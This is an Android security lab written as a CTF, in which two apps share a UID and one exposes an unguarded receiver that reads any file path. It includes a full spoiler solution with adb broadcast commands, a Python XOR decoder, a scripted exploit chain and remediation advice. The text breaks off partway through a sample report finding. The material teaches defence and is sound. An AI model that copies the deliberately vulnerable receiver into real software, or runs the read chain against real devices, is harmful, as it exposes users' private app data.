# Lab 03 — CTF: The Shared UID Heist

**Difficulty:** Intermediate → Advanced (CTF)
**Time:** 2–3 hours
**Chapter:** [09 — Android App Internals](../README.md)
**Depends on:** [Lab 01](lab-01-app-identity-and-uid.md), [Lab 02](lab-02-tracing-the-install-flow.md)

---

## The scenario

A fictional company, **Meridian Assurance**, ships two Android apps.

**Meridian Vault** (`com.meridian.vault`) is the serious one. It stores the customer's policy
documents and an authentication secret. It was written carefully: nothing is exported, nothing is
world-readable, no backup, no debuggable flag, no logging of secrets.

**Meridian Companion** (`com.meridian.companion`) is the throwaway one. It is a notification helper
that a contractor wrote in three weeks. It has an exported component, it does no input validation
worth the name, and nobody has audited it since 2021.

Both were built by the same team, signed with the same key, and — because in 2019 that seemed like a
neat way to share a login session — both declare the same `android:sharedUserId`.

**Your job:** recover the flag stored inside Meridian Vault's private files directory. You may not use
root. You may not use `run-as` on the Vault (it is not debuggable). Everything you need is a
consequence of a single line in two manifests.

> **Mental Model**
> Every lab so far has treated the UID as a wall between apps. This lab is about what happens when
> two apps agree, at build time, to stand on the same side of the wall — and what that does to the
> blast radius of a bug in the app nobody cared about.

---

## Objectives

1. Determine, **statically**, that two packages share a UID, using only the APKs.
2. Confirm it **dynamically** on the device, from at least two independent sources.
3. Reach Meridian Vault's private data from Meridian Companion's process, and explain precisely which
   security check did *not* run and why.
4. Decode the flag, which is deliberately split across two of the Vault's private files.
5. Explain what changes on a modern device when `android:sharedUserMaxSdkVersion` is added, and
   demonstrate the difference.
6. Write the remediation you would give Meridian Assurance, and be honest about what it costs them.

**Flag format:** `MAS{...}` — a single lowercase-and-underscore string inside the braces.

---

## Prerequisites

| Requirement | Check |
|---|---|
| Android Studio or a standalone Gradle + Android SDK | `./gradlew --version` |
| An emulator or device, API 33+ | `adb shell getprop ro.build.version.sdk` |
| `adb`, `aapt2`, `apksigner` on the host | `which adb aapt2 apksigner` |
| Completed Labs 01 and 02 | you need `dumpsys package` fluency |
| **No root required** | that is the point of the lab |

---

## Part A — Build the target

Both apps go in one Gradle project so they share one signing key. Two modules: `vault` and
`companion`.

### A.1 — Project layout

```text
shared-uid-heist/
├── settings.gradle.kts
├── build.gradle.kts
├── heist-key.jks                       (you generate this)
├── vault/
│   ├── build.gradle.kts
│   └── src/main/
│       ├── AndroidManifest.xml
│       └── java/com/meridian/vault/
│           ├── VaultApplication.kt
│           └── VaultActivity.kt
└── companion/
    ├── build.gradle.kts
    └── src/main/
        ├── AndroidManifest.xml
        └── java/com/meridian/companion/
            ├── CompanionActivity.kt
            └── ExfilReceiver.kt
```

### A.2 — Generate one signing key for both apps

This is not optional. `PackageManagerService` refuses to join two packages into a shared user unless
their signing certificates match exactly.

```bash
# host
keytool -genkeypair \
  -keystore heist-key.jks -storepass heistpass -keypass heistpass \
  -alias heist -keyalg RSA -keysize 2048 -validity 10000 \
  -dname "CN=Meridian Assurance, OU=Mobile, O=Meridian, L=Nowhere, C=GB"
```

### A.3 — `settings.gradle.kts`

```kotlin
// settings.gradle.kts
pluginManagement {
    repositories { google(); mavenCentral(); gradlePluginPortal() }
}
dependencyResolutionManagement {
    repositories { google(); mavenCentral() }
}
rootProject.name = "shared-uid-heist"
include(":vault", ":companion")
```

### A.4 — Root `build.gradle.kts`

```kotlin
// build.gradle.kts
plugins {
    id("com.android.application") version "8.5.0" apply false
    id("org.jetbrains.kotlin.android") version "1.9.24" apply false
}
```

### A.5 — `vault/build.gradle.kts`

```kotlin
// vault/build.gradle.kts
plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

android {
    namespace = "com.meridian.vault"
    compileSdk = 34

    defaultConfig {
        applicationId = "com.meridian.vault"
        minSdk = 24
        targetSdk = 34
        versionCode = 1
        versionName = "1.0"
    }

    signingConfigs {
        create("heist") {
            storeFile = rootProject.file("heist-key.jks")
            storePassword = "heistpass"
            keyAlias = "heist"
            keyPassword = "heistpass"
        }
    }

    buildTypes {
        // Deliberately built as a RELEASE-shaped target: not debuggable, so `run-as` is useless.
        release {
            isMinifyEnabled = false
            isDebuggable = false
            signingConfig = signingConfigs.getByName("heist")
        }
        debug {
            // Even the debug build is marked non-debuggable, to keep the challenge honest.
            isDebuggable = false
            signingConfig = signingConfigs.getByName("heist")
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
    kotlinOptions { jvmTarget = "17" }
}
```

### A.6 — `vault/src/main/AndroidManifest.xml`

```xml
<?xml version="1.0" encoding="utf-8"?>
<!--
  vault/src/main/AndroidManifest.xml

  Note what is NOT here:
    - no exported components
    - no android:debuggable
    - allowBackup is false
    - no permissions beyond the default

  And note the ONE line that undoes all of that care:  android:sharedUserId.
-->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    android:sharedUserId="com.meridian.shared">

    <application
        android:name=".VaultApplication"
        android:allowBackup="false"
        android:dataExtractionRules="@null"
        android:label="Meridian Vault"
        android:theme="@android:style/Theme.Material.Light">

        <activity
            android:name=".VaultActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

### A.7 — `vault/src/main/java/com/meridian/vault/VaultApplication.kt`

```kotlin
// vault/src/main/java/com/meridian/vault/VaultApplication.kt
package com.meridian.vault

import android.app.Application
import android.util.Base64
import android.util.Log
import java.io.File
import java.security.SecureRandom

/**
 * Meridian Vault's Application class.
 *
 * On first run it provisions the "customer secret" the way a real, reasonably careful app would:
 *
 *   1. It generates a random 16-byte wrapping key.
 *   2. It XOR-obfuscates the secret with that key (repeating key), and Base64-encodes the result.
 *   3. It writes the obfuscated blob to  filesDir/vault/secret.bin   (mode 0600, inside the sandbox).
 *   4. It writes the wrapping key to     shared_prefs/vault_state.xml  (also inside the sandbox).
 *
 * The developer's reasoning was: "both files are in app-private storage, which only my UID can read,
 * so splitting them adds defence in depth." That reasoning is correct — right up until a second
 * package is granted the same UID.
 *
 * XOR is not encryption and is not presented here as encryption. It exists so that the flag is not
 * recoverable with `strings`, forcing you to read BOTH private files and combine them.
 */
class VaultApplication : Application() {

    companion object {
        private const val TAG = "MeridianVault"
        private const val PREFS = "vault_state"
        private const val KEY_WRAP = "wrap_key_b64"

        // The customer secret. In a real app this would arrive from a server after login.
        // Here it is the flag.
        private const val CUSTOMER_SECRET = "MAS{sh4r3d_u1d_1s_sh4r3d_s4ndb0x}"
    }

    override fun onCreate() {
        super.onCreate()
        provisionSecretIfNeeded()
    }

    private fun provisionSecretIfNeeded() {
        // filesDir is /data/user/<userId>/com.meridian.vault/files — the private, CE-encrypted dir.
        val vaultDir = File(filesDir, "vault")
        val secretFile = File(vaultDir, "secret.bin")
        val prefs = getSharedPreferences(PREFS, MODE_PRIVATE)

        if (secretFile.exists() && prefs.contains(KEY_WRAP)) {
            Log.i(TAG, "Secret already provisioned at ${secretFile.absolutePath}")
            return
        }

        vaultDir.mkdirs()

        // 1. Random wrapping key.
        val wrapKey = ByteArray(16).also { SecureRandom().nextBytes(it) }

        // 2. XOR the secret with the repeating key.
        val plain = CUSTOMER_SECRET.toByteArray(Charsets.UTF_8)
        val wrapped = ByteArray(plain.size) { i -> (plain[i].toInt() xor wrapKey[i % wrapKey.size].toInt()).toByte() }

        // 3. Persist the wrapped blob, Base64 so it survives text handling.
        secretFile.writeText(Base64.encodeToString(wrapped, Base64.NO_WRAP))

        // 4. Persist the wrapping key separately, in SharedPreferences.
        prefs.edit().putString(KEY_WRAP, Base64.encodeToString(wrapKey, Base64.NO_WRAP)).apply()

        // Deliberately NOT logging the secret. The log is not the intended path.
        Log.i(TAG, "Provisioned secret: ${wrapped.size} bytes -> ${secretFile.absolutePath}")
        Log.i(TAG, "My uid=${android.os.Process.myUid()} dataDir=${applicationInfo.dataDir}")
    }
}
```

### A.8 — `vault/src/main/java/com/meridian/vault/VaultActivity.kt`

```kotlin
// vault/src/main/java/com/meridian/vault/VaultActivity.kt
package com.meridian.vault

import android.app.Activity
import android.os.Bundle
import android.os.Process
import android.widget.ScrollView
import android.widget.TextView

/**
 * Shows only non-sensitive status. The secret itself is never rendered — a real app would
 * decrypt it only when the user authenticates. There is no UI path to the flag.
 */
class VaultActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val text = TextView(this).apply {
            setPadding(48, 48, 48, 48)
            textSize = 14f
            text = buildString {
                appendLine("Meridian Vault")
                appendLine("--------------")
                appendLine("package : $packageName")
                appendLine("uid     : ${Process.myUid()}")
                appendLine("pid     : ${Process.myPid()}")
                appendLine("dataDir : ${applicationInfo.dataDir}")
                appendLine("filesDir: $filesDir")
                appendLine()
                appendLine("Customer secret is provisioned and sealed.")
                appendLine("Nothing exported. Not debuggable. No backup.")
            }
        }
        setContentView(ScrollView(this).apply { addView(text) })
    }
}
```

### A.9 — `companion/build.gradle.kts`

```kotlin
// companion/build.gradle.kts
plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

android {
    namespace = "com.meridian.companion"
    compileSdk = 34

    defaultConfig {
        applicationId = "com.meridian.companion"
        minSdk = 24
        targetSdk = 34
        versionCode = 1
        versionName = "1.0"
    }

    signingConfigs {
        create("heist") {
            // SAME keystore, SAME alias. Without this, PMS rejects the shared user.
            storeFile = rootProject.file("heist-key.jks")
            storePassword = "heistpass"
            keyAlias = "heist"
            keyPassword = "heistpass"
        }
    }

    buildTypes {
        release {
            isMinifyEnabled = false
            isDebuggable = false
            signingConfig = signingConfigs.getByName("heist")
        }
        debug {
            isDebuggable = false
            signingConfig = signingConfigs.getByName("heist")
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
    kotlinOptions { jvmTarget = "17" }
}
```

### A.10 — `companion/src/main/AndroidManifest.xml`

```xml
<?xml version="1.0" encoding="utf-8"?>
<!--
  companion/src/main/AndroidManifest.xml

  The same sharedUserId string as the vault. That is the whole vulnerability.

  ExfilReceiver is exported with no permission guard: this stands in for "the companion app
  has a bug". In the real world the bug is usually subtler — a deep link, a WebView, an
  unvalidated intent extra — but the consequence is identical: attacker code runs with the
  companion's identity, which is the vault's identity.
-->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    android:sharedUserId="com.meridian.shared">

    <application
        android:allowBackup="false"
        android:label="Meridian Companion"
        android:theme="@android:style/Theme.Material.Light">

        <activity
            android:name=".CompanionActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- Exported, unguarded. Any app on the device can trigger it. -->
        <receiver
            android:name=".ExfilReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="com.meridian.companion.SYNC" />
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

### A.11 — `companion/src/main/java/com/meridian/companion/CompanionActivity.kt`

```kotlin
// companion/src/main/java/com/meridian/companion/CompanionActivity.kt
package com.meridian.companion

import android.app.Activity
import android.os.Bundle
import android.os.Process
import android.widget.ScrollView
import android.widget.TextView

/**
 * Prints the companion's own identity. Compare the uid printed here with the uid printed by
 * Meridian Vault. If your build is correct, they are the same number.
 */
class CompanionActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val tv = TextView(this).apply {
            setPadding(48, 48, 48, 48)
            textSize = 14f
            text = buildString {
                appendLine("Meridian Companion")
                appendLine("------------------")
                appendLine("package : $packageName")
                appendLine("uid     : ${Process.myUid()}")
                appendLine("pid     : ${Process.myPid()}")
                appendLine("dataDir : ${applicationInfo.dataDir}")
                appendLine()
                appendLine("Trigger the sync receiver with:")
                appendLine("  am broadcast -a com.meridian.companion.SYNC \\")
                appendLine("     -n com.meridian.companion/.ExfilReceiver")
            }
        }
        setContentView(ScrollView(this).apply { addView(tv) })
    }
}
```

### A.12 — `companion/src/main/java/com/meridian/companion/ExfilReceiver.kt`

```kotlin
// companion/src/main/java/com/meridian/companion/ExfilReceiver.kt
package com.meridian.companion

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import java.io.File

/**
 * The "vulnerable" component. It accepts an arbitrary path from an intent extra and prints what it
 * finds there. That is an obviously terrible idea, and it is deliberately obvious: the point of this
 * lab is not to teach you path traversal, it is to teach you what path traversal is WORTH when the
 * process you reach shares its UID with a package that holds real secrets.
 *
 * Substitute any real-world bug class you like here — a WebView with file access, an exported
 * provider with an open openFile(), a deep link that loads a URL. The consequence is the same.
 */
class ExfilReceiver : BroadcastReceiver() {

    companion object { private const val TAG = "MeridianExfil" }

    override fun onReceive(context: Context, intent: Intent) {
        Log.i(TAG, "uid=${android.os.Process.myUid()} pid=${android.os.Process.myPid()}")

        // Caller-controlled path. No canonicalisation, no allow-list, no permission check.
        val path = intent.getStringExtra("path") ?: context.filesDir.absolutePath
        val target = File(path)

        when {
            target.isDirectory -> {
                Log.i(TAG, "DIR $path")
                target.listFiles()?.forEach { Log.i(TAG, "  ${it.name}  ${it.length()} bytes") }
                    ?: Log.i(TAG, "  <unreadable or empty>")
            }
            target.isFile -> {
                // Cap the output so a large file does not flood logcat.
                val bytes = target.readBytes().take(4096).toByteArray()
                Log.i(TAG, "FILE $path (${target.length()} bytes)")
                Log.i(TAG, "CONTENT>>>${String(bytes, Charsets.UTF_8)}<<<")
            }
            else -> Log.w(TAG, "NOT FOUND or NOT READABLE: $path")
        }
    }
}
```

### A.13 — Build and install

```bash
# host
./gradlew :vault:assembleRelease :companion:assembleRelease

# Confirm both APKs carry the SAME certificate before you install anything.
apksigner verify --print-certs vault/build/outputs/apk/release/vault-release.apk     | grep SHA-256
apksigner verify --print-certs companion/build/outputs/apk/release/companion-release.apk | grep SHA-256

adb install -r vault/build/outputs/apk/release/vault-release.apk
adb install -r companion/build/outputs/apk/release/companion-release.apk
```

**Expected output:**

```text
Signer #1 certificate SHA-256 digest: 7f3a...c19d
Signer #1 certificate SHA-256 digest: 7f3a...c19d     <- identical
Success
Success
```

If the second install fails with `INSTALL_FAILED_SHARED_USER_INCOMPATIBLE` or
`INSTALL_FAILED_UPDATE_INCOMPATIBLE`, the certificates differ. Rebuild both from the same keystore.

### A.14 — Provision the flag

The Vault only writes the secret when its `Application.onCreate()` runs, so it must be launched once:

```bash
# host
adb shell am start -n com.meridian.vault/.VaultActivity
adb logcat -d -s MeridianVault
```

**Expected output:**

```text
I/MeridianVault: Provisioned secret: 33 bytes -> /data/user/0/com.meridian.vault/files/vault/secret.bin
I/MeridianVault: My uid=10234 dataDir=/data/user/0/com.meridian.vault
```

The challenge is now live. **Stop reading the source you just typed and treat the two APKs as
black boxes.** Everything from here is what you would do against a client's build.

---

## Part B — The challenge

### Rules

| Allowed | Not allowed |
|---|---|
| `adb shell` as the ordinary `shell` user | `adb root` / `su` / Magisk |
| Static analysis of both APKs | reading `VaultApplication.kt` again |
| `am`, `pm`, `dumpsys` | `run-as com.meridian.vault` (it is not debuggable — try it, and note the error) |
| Anything you can trigger through the Companion | patching and re-signing the Vault |
| logcat | |

### Your deliverables

1. The flag.
2. A written answer to: *which access-control check would normally have stopped you, and why did it
   not run?*
3. A one-paragraph remediation for Meridian Assurance, including the cost.

---

## Hints

Open them in order, and only when genuinely stuck.

<details>
<summary><b>Hint 1</b> — Where do I even start?</summary>

Start with identity, exactly as in Lab 01. Enumerate both packages and compare their UIDs.

```bash
# adb shell
pm list packages -U | grep meridian
```

If two different package names print the **same** `uid:` number, stop and think about what that
means for the filesystem. The kernel's `open()` check does not know about package names — Question 1
of [`../faq.md`](../faq.md).

Then find the mechanism that caused it, from the APKs alone:

```bash
# host
aapt2 dump xmltree vault-release.apk --file AndroidManifest.xml | head -20
```
</details>

<details>
<summary><b>Hint 2</b> — I see the shared UID. How do I turn that into a read?</summary>

You cannot read the Vault's files from your `adb shell` — the shell runs as uid 2000 and the Vault's
directory is mode `0700` owned by `u0_a234`. `run-as` will not help either, because the Vault is not
debuggable. Check both facts yourself so you know they are facts:

```bash
# adb shell
ls -la /data/data/com.meridian.vault
run-as com.meridian.vault ls
```

So you need code that is *already running* as `u0_a234`. You do not have to write it — one is already
installed. Find every exported component of the Companion and ask what each one will do for you:

```bash
# host
aapt2 dump xmltree companion-release.apk --file AndroidManifest.xml | grep -A 12 'E: receiver'
```

```bash
# adb shell
dumpsys package com.meridian.companion | sed -n '/Receiver Resolver Table/,/Service Resolver Table/p'
cmd package query-receivers --brief -a com.meridian.companion.SYNC
```

You can send a broadcast to an exported receiver from the shell with `am broadcast`. Read the receiver
class in JADX and work out what it does with the intent extras.
</details>

<details>
<summary><b>Hint 3</b> — I can list the Vault's files but the secret looks like noise</summary>

That is expected: the blob is Base64 of the secret XOR-ed with a random 16-byte key. Two files, one
flag. You already have a primitive that reads any path the shared UID can read — use it a second time.

Where does an Android app put a `SharedPreferences` file, and what is that directory called?

```text
/data/user/0/<pkg>/shared_prefs/<name>.xml
```

Once you have both halves, the recombination is: Base64-decode both, XOR the secret bytes against the
repeating key bytes, and read the result as UTF-8. Thirty seconds of Python.
</details>

---

## Part C — The modern variant

Once you have the flag, do this part. It is the half of the lesson most write-ups skip.

`android:sharedUserId` is deprecated from API 29, and API 33 added an escape hatch:
`android:sharedUserMaxSdkVersion`.

```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    android:sharedUserId="com.meridian.shared"
    android:sharedUserMaxSdkVersion="32">
```

The semantics are narrow and you must state them precisely:

| Situation | Result |
|---|---|
| Fresh install on a device running API ≤ 32 | shared UID applies, exactly as before |
| Fresh install on a device running API ≥ 33 | attribute ignored, package gets its **own** appId |
| Device already has the package installed with a shared UID, then upgrades Android | keeps the shared UID — the platform will not change an installed package's identity |
| App is updated in place on API ≥ 33 with the new attribute | **keeps** the shared UID; the attribute only affects fresh installs |

### C.1 — Demonstrate it

```bash
# host — rebuild both apps with the new attribute
# (add android:sharedUserMaxSdkVersion="32" to BOTH manifests, then:)
./gradlew :vault:assembleRelease :companion:assembleRelease

adb uninstall com.meridian.vault
adb uninstall com.meridian.companion

adb install -r vault/build/outputs/apk/release/vault-release.apk
adb install -r companion/build/outputs/apk/release/companion-release.apk

adb shell pm list packages -U | grep meridian
```

**Expected output on an API 33+ device:**

```text
package:com.meridian.vault uid:10234
package:com.meridian.companion uid:10235
```

Two different UIDs. Re-run your exploit:

```bash
# adb shell
am broadcast -a com.meridian.companion.SYNC -n com.meridian.companion/.ExfilReceiver \
  --es path /data/user/0/com.meridian.vault/files/vault/secret.bin
logcat -d -s MeridianExfil
```

**Expected output:**

```text
I/MeridianExfil: NOT FOUND or NOT READABLE: /data/user/0/com.meridian.vault/files/vault/secret.bin
```

Same bug in the Companion, same exported receiver, same path traversal — and now it is worth nothing,
because the identity boundary was restored.

### C.2 — Demonstrate the trap

Reinstall the *old* (no-`sharedUserMaxSdkVersion`) builds, launch them so the shared UID is recorded,
then try to upgrade to the new builds in place:

```bash
# host
adb install -r old-vault.apk && adb install -r old-companion.apk
adb shell pm list packages -U | grep meridian      # same uid
adb install -r new-vault.apk                        # in-place upgrade, WITH the new attribute
adb shell pm list packages -U | grep meridian      # STILL the same uid
```

Nothing changed. Existing installs keep the shared UID forever. That is the trap: shipping the
attribute does not fix your installed base, it only stops the problem growing.

### C.3 — Prove that outright removal breaks the upgrade

```bash
# host — build a vault with the sharedUserId line DELETED entirely, then:
adb install -r vault-no-shareduid.apk
```

**Expected output:**

```text
Failure [INSTALL_FAILED_UID_CHANGED: Package com.meridian.vault ... has no signatures that match
those in shared user com.meridian.shared ...]
```

(The exact failure string varies by release — `INSTALL_FAILED_UID_CHANGED`,
`INSTALL_FAILED_SHARED_USER_INCOMPATIBLE` or `INSTALL_FAILED_UPDATE_INCOMPATIBLE` are all possible.
The meaning is identical: the identity would have to change, and Android will not change an installed
package's identity.)

The only route to a non-shared UID for an existing user is uninstall and reinstall, which destroys
their data. That is why "just remove `sharedUserId`" is not advice a senior person gives without also
describing the data-migration plan.

---

## Success criteria

| # | Criterion |
|---|---|
| 1 | You found the shared UID **statically**, from the APKs, before touching the device. |
| 2 | You confirmed it **dynamically** from at least two of: `pm list packages -U`, `dumpsys package … sharedUser=`, `/proc/<pid>/status`. |
| 3 | You recovered the flag without root and without `run-as` on the Vault. |
| 4 | You can name the exact check that did not run, and why. |
| 5 | You demonstrated that `sharedUserMaxSdkVersion` breaks the attack on a fresh install. |
| 6 | You demonstrated that it does **not** help an existing install. |
| 7 | You wrote a remediation that acknowledges the data-migration cost. |

---
---

# SPOILERS BELOW — FULL SOLUTION 

**Everything past this line gives the answer away. Do not read it until you have the flag or have
genuinely exhausted the three hints.**

---
---

## Solution

### S1 — Static discovery

Pull or use the two APKs and read their manifests. `aapt2 dump xmltree` renders the binary manifest:

```bash
# host
aapt2 dump xmltree vault-release.apk --file AndroidManifest.xml | head -15
```

**Output:**

```text
N: android=http://schemas.android.com/apk/res/android
  E: manifest (line=8)
    A: http://schemas.android.com/apk/res/android:sharedUserId(0x0101000b)="com.meridian.shared" (Raw: "com.meridian.shared")
    A: http://schemas.android.com/apk/res/android:versionCode(0x0101021b)=1
    A: package="com.meridian.vault" (Raw: "com.meridian.vault")
```

Same for the companion:

```bash
# host
aapt2 dump xmltree companion-release.apk --file AndroidManifest.xml | grep sharedUserId
```

```text
    A: ...:sharedUserId(0x0101000b)="com.meridian.shared" (Raw: "com.meridian.shared")
```

Identical `sharedUserId` strings. Now verify the second precondition — the signatures must match, or
the shared user would have been refused:

```bash
# host
apksigner verify --print-certs vault-release.apk | grep 'SHA-256 digest'
apksigner verify --print-certs companion-release.apk | grep 'SHA-256 digest'
```

Two identical digests. The conclusion is available before the device is even plugged in: **these two
packages will be one Linux user.**

### S2 — Dynamic confirmation

```bash
# adb shell
pm list packages -U | grep meridian
```

```text
package:com.meridian.companion uid:10234
package:com.meridian.vault uid:10234
```

```bash
# adb shell
dumpsys package com.meridian.vault | grep -E 'userId=|sharedUser|dataDir='
dumpsys package com.meridian.companion | grep -E 'userId=|sharedUser|dataDir='
```

```text
    sharedUser=SharedUserSetting{3f2a1b com.meridian.shared/10234}
    dataDir=/data/user/0/com.meridian.vault
    sharedUser=SharedUserSetting{3f2a1b com.meridian.shared/10234}
    dataDir=/data/user/0/com.meridian.companion
```

Note carefully: **separate data directories, one UID.** The directories are separate for tidiness.
The UID is what the kernel checks. Confirm at the process level:

```bash
# adb shell
am start -n com.meridian.vault/.VaultActivity
am start -n com.meridian.companion/.CompanionActivity
ps -A -Z | grep meridian
```

```text
u:r:untrusted_app:s0:c234,c256,c512,c768 u0_a234 5120 289 ... com.meridian.vault
u:r:untrusted_app:s0:c234,c256,c512,c768 u0_a234 5188 289 ... com.meridian.companion
```

Same user string, same SELinux label including the same MLS categories. Both isolation mechanisms —
UID and SELinux — see one identity.

### S3 — Confirm the intended paths are closed

```bash
# adb shell
ls -la /data/data/com.meridian.vault
```

```text
ls: /data/data/com.meridian.vault: Permission denied
```

```bash
# adb shell
run-as com.meridian.vault ls
```

```text
run-as: package not debuggable: com.meridian.vault
```

Good. The shell cannot read it, and `run-as` is refused. We need code running as uid 10234.

### S4 — Find the reachable component

```bash
# host
aapt2 dump xmltree companion-release.apk --file AndroidManifest.xml | grep -B 2 -A 10 'E: receiver'
```

```text
      E: receiver (line=27)
        A: ...:name="com.meridian.companion.ExfilReceiver"
        A: ...:exported=(type 0x12)0xffffffff
        E: intent-filter
          E: action
            A: ...:name="com.meridian.companion.SYNC"
```

`exported=0xffffffff` is `true`. No `android:permission` attribute, so no permission is required to
send it a broadcast. Decompile to see what it does with the intent:

```bash
# host
jadx -d out companion-release.apk
sed -n '1,80p' out/sources/com/meridian/companion/ExfilReceiver.java
```

The decompiled body shows `intent.getStringExtra("path")` used directly to construct a `File`, with
the contents logged. That is an arbitrary-file-read primitive **executing as uid 10234**.

### S5 — Exploit: list the Vault's private directory

```bash
# adb shell
logcat -c
am broadcast -a com.meridian.companion.SYNC \
  -n com.meridian.companion/.ExfilReceiver \
  --es path /data/user/0/com.meridian.vault/files/vault
logcat -d -s MeridianExfil
```

**Output:**

```text
I/MeridianExfil: uid=10234 pid=5188
I/MeridianExfil: DIR /data/user/0/com.meridian.vault/files/vault
I/MeridianExfil:   secret.bin  44 bytes
```

The read succeeded. No permission was checked, because from the kernel's point of view the process
opening the file **owns** it.

### S6 — Exploit: read both halves

```bash
# adb shell
am broadcast -a com.meridian.companion.SYNC -n com.meridian.companion/.ExfilReceiver \
  --es path /data/user/0/com.meridian.vault/files/vault/secret.bin
logcat -d -s MeridianExfil | tail -3
```

**Output:**

```text
I/MeridianExfil: FILE /data/user/0/com.meridian.vault/files/vault/secret.bin (44 bytes)
I/MeridianExfil: CONTENT>>>PxYrKUgTCEE1WgtEHR9DKlYNRQIVSC5TAg1CGgQ+Ug==<<<
```

That is Base64, and decoding it gives binary noise — it is XOR-wrapped. Find the key. Any Android
developer knows where `SharedPreferences` land:

```bash
# adb shell
am broadcast -a com.meridian.companion.SYNC -n com.meridian.companion/.ExfilReceiver \
  --es path /data/user/0/com.meridian.vault/shared_prefs
logcat -d -s MeridianExfil | tail -3
```

```text
I/MeridianExfil: DIR /data/user/0/com.meridian.vault/shared_prefs
I/MeridianExfil:   vault_state.xml  132 bytes
```

```bash
# adb shell
am broadcast -a com.meridian.companion.SYNC -n com.meridian.companion/.ExfilReceiver \
  --es path /data/user/0/com.meridian.vault/shared_prefs/vault_state.xml
logcat -d -s MeridianExfil | tail -4
```

```text
I/MeridianExfil: FILE .../shared_prefs/vault_state.xml (132 bytes)
I/MeridianExfil: CONTENT>>><?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="wrap_key_b64">bG13ZzVUdHJRc2VlWkRDMQ==</string>
</map>
<<<
```

### S7 — Recombine

```python
# host — solve.py
import base64

# From secret.bin
wrapped = base64.b64decode("PxYrKUgTCEE1WgtEHR9DKlYNRQIVSC5TAg1CGgQ+Ug==")
# From shared_prefs/vault_state.xml
key = base64.b64decode("bG13ZzVUdHJRc2VlWkRDMQ==")

flag = bytes(b ^ key[i % len(key)] for i, b in enumerate(wrapped))
print(flag.decode())
```

```bash
# host
python3 solve.py
```

**Output:**

```text
MAS{sh4r3d_u1d_1s_sh4r3d_s4ndb0x}
```

(Your Base64 strings will differ — the wrapping key is generated randomly on each device. The flag
text is the same.)

### S8 — The one-liner version

Once you understand the primitive, script the whole thing:

```bash
# host — full exploit chain
V=/data/user/0/com.meridian.vault
read_path() {
  adb shell logcat -c
  adb shell am broadcast -a com.meridian.companion.SYNC \
    -n com.meridian.companion/.ExfilReceiver --es path "$1" > /dev/null
  adb shell logcat -d -s MeridianExfil | sed -n 's/.*CONTENT>>>\(.*\)<<</\1/p'
}

BLOB=$(read_path "$V/files/vault/secret.bin")
KEYX=$(read_path "$V/shared_prefs/vault_state.xml" | sed -n 's/.*wrap_key_b64">\([^<]*\)<.*/\1/p')

python3 - "$BLOB" "$KEYX" <<'PY'
import base64, sys
w = base64.b64decode(sys.argv[1]); k = base64.b64decode(sys.argv[2])
print(bytes(b ^ k[i % len(k)] for i, b in enumerate(w)).decode())
PY
```

### S9 — Which check did not run, and why

The answer people give is "there was no permission check", and that is only half right. The precise
answer:

The check that normally protects `/data/user/0/com.meridian.vault/files/vault/secret.bin` is the
**kernel's discretionary access control on `open()`**. The directory is mode `0700` and owned by uid
10234; a process with any other UID fails the check in the VFS before a single byte is read. No
Android framework code is involved, which is exactly why it is so reliable.

`PackageManagerService` allocated **one** appId — 10234 — to the shared user `com.meridian.shared`,
and both packages' processes were started by Zygote with that UID. So when the Companion's process
called `open()`, the kernel compared 10234 against 10234, found a match, and allowed it. **The check
ran and it passed**, because from the kernel's point of view there is exactly one application here.

The SELinux layer did not stop it either, and for the same reason: the MLS categories are computed
from `(appId, userId)`, and both processes have the same appId, hence the identical
`c234,c256,c512,c768`. Both of Android's independent isolation mechanisms are keyed on an identity
that these two packages deliberately merged.

That is the lesson. `sharedUserId` does not weaken the sandbox; it **redraws** it, so that both apps
are inside the same one.

### S10 — Remediation for Meridian Assurance

The correct advice, with its cost stated honestly:

1. **New apps: never use `sharedUserId`.** It is deprecated at API 29. Anything it was used for is
   better served by a signature-level permission, a bound `Service` with an explicit AIDL contract, a
   `ContentProvider` with `android:grantUriPermissions` and per-URI grants, or a shared
   account through `AccountManager`.

2. **Existing apps: add `android:sharedUserMaxSdkVersion="32"` to every member immediately.** This
   costs nothing and stops the problem growing: every *new* install on API 33+ gets separate UIDs.
   It does **not** help any device where the apps are already installed.

3. **For the installed base, plan a real migration.** Removing `sharedUserId` outright makes the
   upgrade fail with an identity-changed error, so the sequence has to be: ship a version that
   exports the user's data through a signature-permission-guarded interface or an
   encrypted export blob; have the user install the new, separately-identified app; import; then
   retire the old package. There is no in-place, zero-touch path. Any consultant who tells the
   client "just delete the line" has not tried it.

4. **Independent of the UID question, fix the actual bug.** `ExfilReceiver` must not be exported, and
   must not accept a caller-supplied filesystem path. Set `android:exported="false"`, or guard it
   with a `signature`-protection-level permission, and canonicalise-and-allow-list any path it
   handles.

5. **Treat every member of a shared user as in scope for the highest-value member's threat model.**
   If the Vault is worth a penetration test, so is the Companion — they are the same application as
   far as the operating system is concerned. That is a scoping decision, and it is the one Meridian
   got wrong three years before the bug was written.

### S11 — What a report finding looks like

> **Finding: shared Linux identity between `com.meridian.vault` and `com.meridian.companion`**
> **Severity: High**
>
> Both packages declare `android:sharedUserId="com.meridian.shared"` and are signed with the same
> key, so `PackageManagerService` assigns them a single appId (observed: 10234). Every process of
> both applications therefore runs as the same Linux UID with identical SELinux MLS categories, and
